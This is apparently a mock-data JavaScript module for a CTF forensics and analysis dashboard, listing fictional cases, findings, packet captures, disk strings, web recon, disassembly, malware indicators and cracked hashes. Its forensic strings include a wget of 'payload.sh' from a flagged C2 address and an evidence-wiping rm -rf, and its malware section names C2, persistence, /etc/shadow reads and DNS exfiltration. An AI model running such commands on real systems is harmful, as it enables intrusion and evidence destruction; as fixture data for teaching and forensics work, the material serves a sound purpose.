// CTFKit Mock Data
export const activeCase = {
  id: 'case-004',
  name: 'Hack4Gov 2026',
  challenge: 'Challenge 04 — Shadow Protocol',
  status: 'open',
  created: '2026-08-14T08:30:00Z',
  files: 12,
  findings: 23,
  flags: 3,
  runningJobs: 2,
};

export const cases = [
  { id: 'case-004', name: 'Hack4Gov 2026', challenge: 'Challenge 04 — Shadow Protocol', status: 'open', files: 12, findings: 23, flags: 3, created: '2026-08-14T08:30:00Z' },
  { id: 'case-003', name: 'Hack4Gov 2026', challenge: 'Challenge 03 — Hidden Layers', status: 'open', files: 8, findings: 14, flags: 2, created: '2026-08-13T14:00:00Z' },
  { id: 'case-002', name: 'CyberStorm CTF', challenge: 'Forensics — Memory Lane', status: 'closed', files: 5, findings: 9, flags: 1, created: '2026-08-10T09:00:00Z' },
  { id: 'case-001', name: 'CyberStorm CTF', challenge: 'Web — Broken Auth', status: 'closed', files: 3, findings: 6, flags: 1, created: '2026-08-10T08:00:00Z' },
];

export const artifacts = [
  { id: 'a1', name: 'capture.pcap', type: 'PCAP', size: '14.2 MB', analyzer: 'Network', status: 'complete', findings: 8, hash: 'a3f2b8c1' },
  { id: 'a2', name: 'memory.raw', type: 'Memory Dump', size: '256 MB', analyzer: 'Forensics', status: 'running', findings: 5, hash: 'e7d4a912' },
  { id: 'a3', name: 'suspicious.png', type: 'Image', size: '342 KB', analyzer: 'Stego', status: 'complete', findings: 2, hash: 'b1c8f3e5' },
  { id: 'a4', name: 'filesystem.dd', type: 'Disk Image', size: '512 MB', analyzer: 'Forensics', status: 'queued', findings: 0, hash: '9f2a7b4c' },
  { id: 'a5', name: 'challenge.zip', type: 'Archive', size: '2.1 MB', analyzer: 'Auto', status: 'complete', findings: 4, hash: 'c5d8e1f2' },
  { id: 'a6', name: 'crackme', type: 'ELF Binary', size: '18 KB', analyzer: 'Reverse Eng.', status: 'complete', findings: 3, hash: 'd3a6b9c0' },
  { id: 'a7', name: 'traffic.log', type: 'Log File', size: '890 KB', analyzer: 'Network', status: 'complete', findings: 1, hash: 'f1e4d7a8' },
];

export const findings = [
  { id: 'f1', severity: 'high', title: 'FTP credentials discovered in cleartext', source: 'capture.pcap', confidence: 95, module: 'Network', timestamp: '2026-08-14T10:42:18Z' },
  { id: 'f2', severity: 'high', title: 'Possible flag: CTF{sh4d0w_pr0t0c0l_br34ch}', source: 'challenge.zip', confidence: 92, module: 'Auto Triage', timestamp: '2026-08-14T10:38:05Z' },
  { id: 'f3', severity: 'medium', title: 'Embedded ZIP archive detected in PNG', source: 'suspicious.png', confidence: 88, module: 'Stego', timestamp: '2026-08-14T10:35:22Z' },
  { id: 'f4', severity: 'medium', title: 'Suspicious DNS TXT record queries', source: 'capture.pcap', confidence: 78, module: 'Network', timestamp: '2026-08-14T10:30:44Z' },
  { id: 'f5', severity: 'low', title: 'Metadata username: admin_shadow', source: 'suspicious.png', confidence: 100, module: 'Stego', timestamp: '2026-08-14T10:28:11Z' },
  { id: 'f6', severity: 'high', title: 'Password hash found in memory dump', source: 'memory.raw', confidence: 85, module: 'Forensics', timestamp: '2026-08-14T10:25:33Z' },
  { id: 'f7', severity: 'medium', title: 'Base64-encoded payload in HTTP response', source: 'capture.pcap', confidence: 82, module: 'Network', timestamp: '2026-08-14T10:22:17Z' },
  { id: 'f8', severity: 'low', title: 'Non-standard HTTP headers detected', source: 'capture.pcap', confidence: 65, module: 'Network', timestamp: '2026-08-14T10:20:09Z' },
  { id: 'f9', severity: 'info', title: 'Binary compiled with GCC 11.2', source: 'crackme', confidence: 100, module: 'Reverse Eng.', timestamp: '2026-08-14T10:15:44Z' },
  { id: 'f10', severity: 'medium', title: 'Deleted file recovered: secret.txt', source: 'filesystem.dd', confidence: 90, module: 'Forensics', timestamp: '2026-08-14T10:12:30Z' },
  { id: 'f11', severity: 'high', title: 'Hardcoded API key in binary strings', source: 'crackme', confidence: 88, module: 'Reverse Eng.', timestamp: '2026-08-14T10:08:55Z' },
  { id: 'f12', severity: 'low', title: 'EXIF GPS coordinates present', source: 'suspicious.png', confidence: 100, module: 'Stego', timestamp: '2026-08-14T10:05:18Z' },
];

export const timeline = [
  { time: '2026-08-14T10:42:18Z', event: 'FTP credentials recovered from PCAP stream', type: 'success', module: 'Network' },
  { time: '2026-08-14T10:38:05Z', event: 'Flag candidate discovered in extracted archive', type: 'success', module: 'Auto Triage' },
  { time: '2026-08-14T10:35:22Z', event: 'Hidden ZIP archive detected in suspicious.png', type: 'warning', module: 'Stego' },
  { time: '2026-08-14T10:30:44Z', event: 'PCAP analysis completed — 8 findings', type: 'info', module: 'Network' },
  { time: '2026-08-14T10:28:11Z', event: 'Metadata extraction complete for suspicious.png', type: 'info', module: 'Stego' },
  { time: '2026-08-14T10:25:33Z', event: 'Memory dump analysis started', type: 'info', module: 'Forensics' },
  { time: '2026-08-14T10:22:00Z', event: 'Archive challenge.zip extracted — 4 files', type: 'info', module: 'Auto Triage' },
  { time: '2026-08-14T10:18:30Z', event: 'Files uploaded to case', type: 'info', module: 'System' },
  { time: '2026-08-14T10:15:44Z', event: 'Binary crackme identified as ELF x86_64', type: 'info', module: 'Reverse Eng.' },
  { time: '2026-08-14T10:12:30Z', event: 'Deleted file secret.txt recovered', type: 'warning', module: 'Forensics' },
];

export const evidenceGraph = {
  nodes: [
    { id: 'n1', label: 'capture.pcap', type: 'artifact', x: 60, y: 50 },
    { id: 'n2', label: 'FTP creds', type: 'finding', x: 220, y: 20 },
    { id: 'n3', label: 'DNS TXT data', type: 'finding', x: 220, y: 80 },
    { id: 'n4', label: 'memory.raw', type: 'artifact', x: 60, y: 140 },
    { id: 'n5', label: 'password hash', type: 'finding', x: 220, y: 140 },
    { id: 'n6', label: 'challenge.zip', type: 'artifact', x: 380, y: 80 },
    { id: 'n7', label: 'secret.txt', type: 'file', x: 540, y: 50 },
    { id: 'n8', label: 'CTF{...flag}', type: 'flag', x: 700, y: 50 },
    { id: 'n9', label: 'suspicious.png', type: 'artifact', x: 380, y: 140 },
    { id: 'n10', label: 'embedded.zip', type: 'file', x: 540, y: 140 },
  ],
  edges: [
    { from: 'n1', to: 'n2' },
    { from: 'n1', to: 'n3' },
    { from: 'n4', to: 'n5' },
    { from: 'n5', to: 'n6' },
    { from: 'n3', to: 'n6' },
    { from: 'n6', to: 'n7' },
    { from: 'n7', to: 'n8' },
    { from: 'n9', to: 'n10' },
    { from: 'n10', to: 'n7' },
  ],
};

export const pcapData = {
  summary: {
    totalPackets: 48293,
    duration: '00:12:34',
    uniqueHosts: 14,
    tcpStreams: 127,
    dnsRequests: 342,
    httpRequests: 89,
  },
  protocols: [
    { protocol: 'TCP', packets: 38210, pct: 79.1 },
    { protocol: 'UDP', packets: 6847, pct: 14.2 },
    { protocol: 'DNS', packets: 1982, pct: 4.1 },
    { protocol: 'HTTP', packets: 892, pct: 1.8 },
    { protocol: 'ICMP', packets: 234, pct: 0.5 },
    { protocol: 'ARP', packets: 128, pct: 0.3 },
  ],
  conversations: [
    { src: '192.168.1.105', dst: '10.0.0.42', protocol: 'TCP', packets: 4821, bytes: '2.3 MB', note: 'FTP transfer' },
    { src: '192.168.1.105', dst: '8.8.8.8', protocol: 'DNS', packets: 342, bytes: '48 KB', note: 'DNS queries' },
    { src: '192.168.1.105', dst: '203.0.113.50', protocol: 'HTTP', packets: 1205, bytes: '890 KB', note: 'Web traffic' },
    { src: '192.168.1.105', dst: '10.0.0.42', protocol: 'TCP', packets: 892, bytes: '156 KB', note: 'SSH session' },
    { src: '10.0.0.42', dst: '192.168.1.200', protocol: 'TCP', packets: 567, bytes: '1.1 MB', note: 'Data exfil?' },
    { src: '192.168.1.105', dst: '198.51.100.10', protocol: 'HTTP', packets: 234, bytes: '340 KB', note: 'C2 beacon?' },
  ],
  streams: [
    { id: 0, src: '192.168.1.105:42381', dst: '10.0.0.42:21', protocol: 'FTP', bytes: '2.3 MB', flags: ['credentials', 'file-transfer'] },
    { id: 1, src: '192.168.1.105:55892', dst: '203.0.113.50:80', protocol: 'HTTP', bytes: '890 KB', flags: ['base64-payload'] },
    { id: 2, src: '192.168.1.105:38201', dst: '10.0.0.42:22', protocol: 'SSH', bytes: '156 KB', flags: [] },
    { id: 3, src: '10.0.0.42:49123', dst: '192.168.1.200:8443', protocol: 'HTTPS', bytes: '1.1 MB', flags: ['suspicious'] },
    { id: 4, src: '192.168.1.105:60129', dst: '198.51.100.10:80', protocol: 'HTTP', bytes: '340 KB', flags: ['c2-beacon'] },
  ],
  rawStream: {
    ascii: `220 Shadow FTP Server Ready\r\nUSER admin_shadow\r\n331 Password required\r\nPASS pr0t0c0l_2026!\r\n230 Login successful\r\nPASV\r\n227 Entering Passive Mode (10,0,0,42,195,12)\r\nRETR secret_archive.zip\r\n150 Opening BINARY mode data connection\r\n226 Transfer complete\r\nQUIT\r\n221 Goodbye`,
    hex: `00000000  32 32 30 20 53 68 61 64  6f 77 20 46 54 50 20 53  |220 Shadow FTP S|
00000010  65 72 76 65 72 20 52 65  61 64 79 0d 0a 55 53 45  |erver Ready..USE|
00000020  52 20 61 64 6d 69 6e 5f  73 68 61 64 6f 77 0d 0a  |R admin_shadow..|
00000030  33 33 31 20 50 61 73 73  77 6f 72 64 20 72 65 71  |331 Password req|
00000040  75 69 72 65 64 0d 0a 50  41 53 53 20 70 72 30 74  |uired..PASS pr0t|
00000050  30 63 30 6c 5f 32 30 32  36 21 0d 0a 32 33 30 20  |0c0l_2026!..230 |
00000060  4c 6f 67 69 6e 20 73 75  63 63 65 73 73 66 75 6c  |Login successful|`,
  },
};

export const forensicsData = {
  fileTree: [
    { path: '/', type: 'dir', children: [
      { path: '/home', type: 'dir', children: [
        { path: '/home/user', type: 'dir', children: [
          { path: '/home/user/secret.txt', type: 'file', size: '1.2 KB', deleted: true, interesting: true },
          { path: '/home/user/.bash_history', type: 'file', size: '4.5 KB', deleted: false, interesting: true },
          { path: '/home/user/Documents', type: 'dir', children: [
            { path: '/home/user/Documents/notes.txt', type: 'file', size: '892 B', deleted: false },
            { path: '/home/user/Documents/plan.pdf', type: 'file', size: '245 KB', deleted: false },
          ]},
          { path: '/home/user/Downloads', type: 'dir', children: [
            { path: '/home/user/Downloads/tool.exe', type: 'file', size: '1.8 MB', deleted: true, interesting: true },
          ]},
        ]},
      ]},
      { path: '/tmp', type: 'dir', children: [
        { path: '/tmp/.hidden_script.sh', type: 'file', size: '340 B', deleted: false, interesting: true },
        { path: '/tmp/cache_data', type: 'file', size: '12 KB', deleted: false },
      ]},
      { path: '/var', type: 'dir', children: [
        { path: '/var/log', type: 'dir', children: [
          { path: '/var/log/auth.log', type: 'file', size: '28 KB', deleted: false, interesting: true },
          { path: '/var/log/syslog', type: 'file', size: '156 KB', deleted: false },
        ]},
      ]},
      { path: '/etc', type: 'dir', children: [
        { path: '/etc/shadow', type: 'file', size: '1.1 KB', deleted: false, interesting: true },
        { path: '/etc/passwd', type: 'file', size: '2.4 KB', deleted: false },
      ]},
    ]},
  ],
  metadata: [
    { key: 'Image Type', value: 'Raw DD Image' },
    { key: 'File System', value: 'ext4' },
    { key: 'Total Size', value: '512 MB' },
    { key: 'Used Space', value: '187 MB' },
    { key: 'Free Space', value: '325 MB' },
    { key: 'Block Size', value: '4096' },
    { key: 'Volume Label', value: 'shadow_fs' },
    { key: 'Last Mounted', value: '2026-08-12 23:14:02 UTC' },
    { key: 'OS', value: 'Linux' },
  ],
  strings: [
    { offset: '0x0042F1A0', value: 'password: pr0t0c0l_2026!', context: 'bash_history' },
    { offset: '0x008A2C30', value: 'CTF{d3l3t3d_but_n0t_g0n3}', context: 'secret.txt (deleted)' },
    { offset: '0x00F14B20', value: 'ssh admin@10.0.0.42', context: 'bash_history' },
    { offset: '0x01A82D40', value: 'wget http://198.51.100.10/payload.sh', context: 'bash_history' },
    { offset: '0x02C91E60', value: 'rm -rf /home/user/evidence/', context: 'bash_history' },
    { offset: '0x03D0A180', value: 'base64 -d encoded.txt > decoded.bin', context: 'bash_history' },
  ],
};

export const cryptoData = {
  transforms: ['Base64', 'Base32', 'Hex', 'URL Encoding', 'ROT13', 'Caesar', 'XOR', 'Vigenère', 'Reverse', 'Binary'],
  pipeline: [
    { id: 1, name: 'Base64 Decode', params: {} },
    { id: 2, name: 'Hex Decode', params: {} },
    { id: 3, name: 'XOR', params: { key: '0x17' } },
  ],
  results: [
    { chain: 'Base64 → Hex → XOR(0x17)', value: 'CTF{cr1pt0_ch41n_m4st3r}', confidence: 94 },
    { chain: 'Base64 → ROT13', value: 'PGS{pe1cg0_pu41a_z4fg3e}', confidence: 32 },
    { chain: 'Base64', value: '4354467b637231637430', confidence: 15 },
  ],
};

export const webData = {
  target: 'https://challenge.hack4gov.ctf:8443',
  status: 'Active',
  technologies: ['nginx/1.21.0', 'PHP 8.1', 'jQuery 3.6', 'Bootstrap 5'],
  endpoints: [
    { path: '/api/login', method: 'POST', status: 200, params: 'username, password', note: 'Auth endpoint' },
    { path: '/api/users', method: 'GET', status: 403, params: 'token', note: 'Requires admin' },
    { path: '/api/upload', method: 'POST', status: 200, params: 'file, type', note: 'File upload' },
    { path: '/admin/panel', method: 'GET', status: 302, params: '', note: 'Redirects to login' },
    { path: '/api/export', method: 'GET', status: 200, params: 'format, id', note: 'IDOR vulnerability?' },
    { path: '/debug/phpinfo', method: 'GET', status: 200, params: '', note: 'Info disclosure' },
    { path: '/.git/HEAD', method: 'GET', status: 200, params: '', note: 'Git exposure' },
    { path: '/robots.txt', method: 'GET', status: 200, params: '', note: 'Disallow: /admin/' },
  ],
  cookies: [
    { name: 'session_id', value: 'a3f2b8c1d4e5...', flags: 'HttpOnly', secure: false, note: 'Not Secure flag' },
    { name: 'admin_token', value: 'eyJhbGciOi...', flags: '', secure: false, note: 'JWT in cookie' },
  ],
  headers: [
    { header: 'Server', value: 'nginx/1.21.0', note: 'Version exposed' },
    { header: 'X-Powered-By', value: 'PHP/8.1.0', note: 'Version exposed' },
    { header: 'X-Frame-Options', value: 'MISSING', note: 'Clickjacking risk' },
    { header: 'Content-Security-Policy', value: 'MISSING', note: 'No CSP' },
  ],
  comments: [
    { file: '/js/app.min.js', line: 42, text: '// TODO: remove debug endpoint before prod' },
    { file: '/index.html', line: 15, text: '<!-- admin password: ch4ng3m3 -->' },
  ],
};

export const reverseData = {
  binary: {
    name: 'crackme',
    arch: 'x86_64',
    type: 'ELF 64-bit LSB executable',
    compiler: 'GCC 11.2.0',
    stripped: false,
    size: '18 KB',
  },
  protections: [
    { name: 'PIE', value: 'Enabled', status: 'enabled' },
    { name: 'NX', value: 'Enabled', status: 'enabled' },
    { name: 'Stack Canary', value: 'Enabled', status: 'enabled' },
    { name: 'RELRO', value: 'Partial', status: 'partial' },
    { name: 'ASLR', value: 'Enabled', status: 'enabled' },
    { name: 'Fortify', value: 'Disabled', status: 'disabled' },
  ],
  sections: [
    { name: '.text', vaddr: '0x00001060', size: '0x0a2c', perms: 'r-x' },
    { name: '.rodata', vaddr: '0x00002000', size: '0x0214', perms: 'r--' },
    { name: '.data', vaddr: '0x00004000', size: '0x0018', perms: 'rw-' },
    { name: '.bss', vaddr: '0x00004020', size: '0x0008', perms: 'rw-' },
    { name: '.got.plt', vaddr: '0x00003f90', size: '0x0048', perms: 'rw-' },
  ],
  imports: ['printf', 'scanf', 'strcmp', 'strlen', 'malloc', 'free', 'exit', 'puts', 'memcpy', 'fopen', 'fread', 'fclose'],
  exports: ['main', 'check_password', 'decrypt_flag', 'validate_input'],
  strings: [
    { offset: '0x2000', value: 'Enter password: ' },
    { offset: '0x2011', value: 'Access granted!' },
    { offset: '0x2021', value: 'Wrong password!' },
    { offset: '0x2031', value: 'CTF{r3v3rs3_3ng1n33r1ng}' },
    { offset: '0x204a', value: 'Usage: ./crackme <password>' },
    { offset: '0x2065', value: 'sk3l3t0n_k3y_2026' },
  ],
  disassembly: [
    { addr: '0x00001189', bytes: '55', instr: 'push   rbp' },
    { addr: '0x0000118a', bytes: '48 89 e5', instr: 'mov    rbp, rsp' },
    { addr: '0x0000118d', bytes: '48 83 ec 20', instr: 'sub    rsp, 0x20' },
    { addr: '0x00001191', bytes: '89 7d ec', instr: 'mov    [rbp-0x14], edi' },
    { addr: '0x00001194', bytes: '48 89 75 e0', instr: 'mov    [rbp-0x20], rsi' },
    { addr: '0x00001198', bytes: '83 7d ec 02', instr: 'cmp    dword [rbp-0x14], 0x2' },
    { addr: '0x0000119c', bytes: '74 16', instr: 'je     0x11b4' },
    { addr: '0x0000119e', bytes: '48 8d 05 a5 0e 00 00', instr: 'lea    rax, [rip+0xea5]    ; "Usage: ./crackme <password>"' },
    { addr: '0x000011a5', bytes: 'e8 b6 fe ff ff', instr: 'call   puts@plt' },
    { addr: '0x000011aa', bytes: 'bf 01 00 00 00', instr: 'mov    edi, 0x1' },
    { addr: '0x000011af', bytes: 'e8 bc fe ff ff', instr: 'call   exit@plt' },
    { addr: '0x000011b4', bytes: '48 8b 45 e0', instr: 'mov    rax, [rbp-0x20]' },
    { addr: '0x000011b8', bytes: '48 8b 78 08', instr: 'mov    rdi, [rax+0x8]' },
    { addr: '0x000011bc', bytes: 'e8 4f 00 00 00', instr: 'call   check_password' },
    { addr: '0x000011c1', bytes: '85 c0', instr: 'test   eax, eax' },
    { addr: '0x000011c3', bytes: '74 11', instr: 'je     0x11d6' },
    { addr: '0x000011c5', bytes: '48 8d 05 45 0e 00 00', instr: 'lea    rax, [rip+0xe45]    ; "Access granted!"' },
    { addr: '0x000011cc', bytes: 'e8 8f fe ff ff', instr: 'call   puts@plt' },
    { addr: '0x000011d1', bytes: 'e8 5a 00 00 00', instr: 'call   decrypt_flag' },
  ],
};

export const osintData = {
  queries: [
    { query: 'admin_shadow', type: 'username' },
    { query: '198.51.100.10', type: 'ip' },
  ],
  entities: [
    { type: 'Username', value: 'admin_shadow', source: 'Metadata / PCAP', platforms: ['GitHub', 'Twitter', 'HackerOne'] },
    { type: 'Email', value: 'admin_shadow@protonmail.com', source: 'GitHub profile', confidence: 75 },
    { type: 'IP Address', value: '198.51.100.10', source: 'PCAP analysis', location: 'Frankfurt, DE', asn: 'AS24940 Hetzner', note: 'C2 server?' },
    { type: 'Domain', value: 'shadow-ops.example.com', source: 'DNS reverse lookup', registrar: 'Namecheap', created: '2026-07-01' },
    { type: 'IP Address', value: '203.0.113.50', source: 'PCAP analysis', location: 'Amsterdam, NL', asn: 'AS60781 LeaseWeb' },
    { type: 'Username', value: 'sh4dow_admin', source: 'Linked account', platforms: ['Reddit'] },
  ],
  relationships: [
    { from: 'admin_shadow', to: 'admin_shadow@protonmail.com', relation: 'registered with' },
    { from: '198.51.100.10', to: 'shadow-ops.example.com', relation: 'resolves to' },
    { from: 'admin_shadow', to: 'sh4dow_admin', relation: 'linked account' },
  ],
};

export const stegoData = {
  image: 'suspicious.png',
  metadata: [
    { key: 'Format', value: 'PNG' },
    { key: 'Dimensions', value: '1920×1080' },
    { key: 'Color Depth', value: '24-bit RGB' },
    { key: 'File Size', value: '342 KB' },
    { key: 'Expected Size', value: '~280 KB' },
    { key: 'Size Anomaly', value: '+22% larger than expected' },
    { key: 'EXIF Author', value: 'admin_shadow' },
    { key: 'EXIF Software', value: 'GIMP 2.10' },
    { key: 'GPS Latitude', value: '48.8566° N' },
    { key: 'GPS Longitude', value: '2.3522° E' },
  ],
  analyses: [
    { name: 'LSB Analysis', status: 'complete', result: 'Hidden data detected in least significant bits' },
    { name: 'File Carving', status: 'complete', result: 'Embedded ZIP archive found at offset 0x3A2F0' },
    { name: 'String Search', status: 'complete', result: '2 interesting strings found' },
    { name: 'Palette Analysis', status: 'complete', result: 'No anomalies detected' },
    { name: 'Histogram Analysis', status: 'complete', result: 'Minor irregularity in blue channel' },
  ],
};

export const binaryPwnData = {
  target: 'crackme',
  checksec: reverseData.protections,
  vulnerabilities: [
    { type: 'Buffer Overflow', function: 'validate_input', offset: '0x1210', severity: 'high', note: 'Stack buffer overflow via scanf — no bounds check' },
    { type: 'Format String', function: 'printf call at 0x11cc', offset: '0x11cc', severity: 'medium', note: 'User input passed directly to printf' },
  ],
  gadgets: [
    { addr: '0x000011ef', instr: 'pop rdi; ret' },
    { addr: '0x000011f1', instr: 'pop rsi; pop r15; ret' },
    { addr: '0x00001016', instr: 'ret' },
  ],
};

export const malwareData = {
  sample: {
    name: 'payload.sh',
    type: 'Shell Script',
    size: '4.2 KB',
    md5: 'a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5',
    sha256: '9f2a7b4c8d1e3f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9',
  },
  indicators: [
    { type: 'C2 Server', value: '198.51.100.10:4444', severity: 'high' },
    { type: 'Download URL', value: 'http://198.51.100.10/stage2.bin', severity: 'high' },
    { type: 'Persistence', value: '/etc/cron.d/sysupdate', severity: 'medium' },
    { type: 'Data Exfil', value: 'DNS TXT tunneling to shadow-ops.example.com', severity: 'high' },
  ],
  behavior: [
    { action: 'Network connection', detail: 'Connects to 198.51.100.10:4444', risk: 'high' },
    { action: 'File creation', detail: 'Creates /tmp/.hidden_script.sh', risk: 'medium' },
    { action: 'Cron job', detail: 'Adds persistence via crontab', risk: 'medium' },
    { action: 'Data collection', detail: 'Reads /etc/shadow, /etc/passwd', risk: 'high' },
    { action: 'DNS exfiltration', detail: 'Encodes data in DNS TXT queries', risk: 'high' },
  ],
};

export const hashesData = {
  hashes: [
    { hash: '$6$rounds=5000$salt$a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0', type: 'SHA-512 crypt', status: 'cracked', plaintext: 'pr0t0c0l_2026!', source: '/etc/shadow' },
    { hash: '5f4dcc3b5aa765d61d8327deb882cf99', type: 'MD5', status: 'cracked', plaintext: 'password', source: 'memory.raw' },
    { hash: 'e7d4a912b3c5f8a1d2e6f9b0c4a7d3e8', type: 'MD5', status: 'cracking', plaintext: '', source: 'capture.pcap' },
    { hash: 'aab9e1de16f38176f86d7a92ba337a8d', type: 'NTLM', status: 'not-started', plaintext: '', source: 'memory.raw' },
  ],
  tools: ['hashcat', 'john', 'Online lookup', 'Rainbow tables'],
};

export const wordlistsData = [
  { name: 'rockyou.txt', entries: 14344391, size: '134 MB', desc: 'Classic password wordlist' },
  { name: 'SecLists/common.txt', entries: 4658, size: '38 KB', desc: 'Common passwords' },
  { name: 'custom-ctf.txt', entries: 2847, size: '24 KB', desc: 'CTF-specific patterns' },
  { name: 'dirb/common.txt', entries: 4614, size: '36 KB', desc: 'Directory brute-force' },
  { name: 'subdomains-top1m.txt', entries: 114532, size: '1.8 MB', desc: 'Subdomain enumeration' },
];

// SVG Icons (inline, compact)
export const icons = {
  dashboard: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>',
  cases: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>',
  triage: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>',
  web: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
  crypto: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
  forensics: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/><line x1="11" y1="8" x2="11" y2="14"/><line x1="8" y1="11" x2="14" y2="11"/></svg>',
  network: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>',
  osint: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>',
  stego: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>',
  reverse: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>',
  binary: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>',
  malware: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>',
  hashes: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>',
  wordlists: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>',
  reports: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>',
  settings: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
  search: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>',
  chevronDown: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>',
  chevronRight: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>',
